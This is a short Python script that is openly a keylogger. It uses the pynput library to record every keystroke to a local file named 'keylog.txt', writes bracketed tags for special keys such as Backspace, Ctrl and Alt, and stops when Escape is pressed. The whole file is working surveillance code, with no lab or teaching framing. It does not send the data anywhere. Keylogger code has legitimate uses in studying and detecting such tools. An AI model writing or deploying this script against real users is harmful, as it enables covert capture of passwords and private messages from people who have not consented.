import pynput
from pynput.keyboard import Key, Listener

# File to log the typed keys
log_file = "keylog.txt"

# Function to write the keys to the log file handling the special cases
def write_to_file(key):
    with open(log_file, "a") as file:
        key_data = str(key).replace("'", "")
        if key == Key.space:
            file.write(' ')
        elif key == Key.enter:
            file.write('\n')
        elif key == Key.backspace:
            file.write(" [BACKSPACE] ")
        elif key == Key.tab:
            file.write(" [TAB] ")
        elif key == Key.ctrl:
            file.write(" [CTRL] ")
        elif key == Key.cmd: 
            file.write(" [CMD] ")
        elif key == Key.tab:
            file.write(" [TAB] ")
        elif key == Key.caps_lock:
            file.write(" [CAPSLOCK] ")
        elif key == Key.alt:
            file.write(" [ALT] ")
        elif key == Key.esc:
            file.write(" [ESC] ")
        else:
            file.write(key_data)

# Function called when a key is pressed
def on_press(key):
    write_to_file(key)

# Function called when a key is released
def on_release(key):
    if key == Key.esc:
        # Stop listener if ESC is pressed
        return False

# Setup the listener for key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()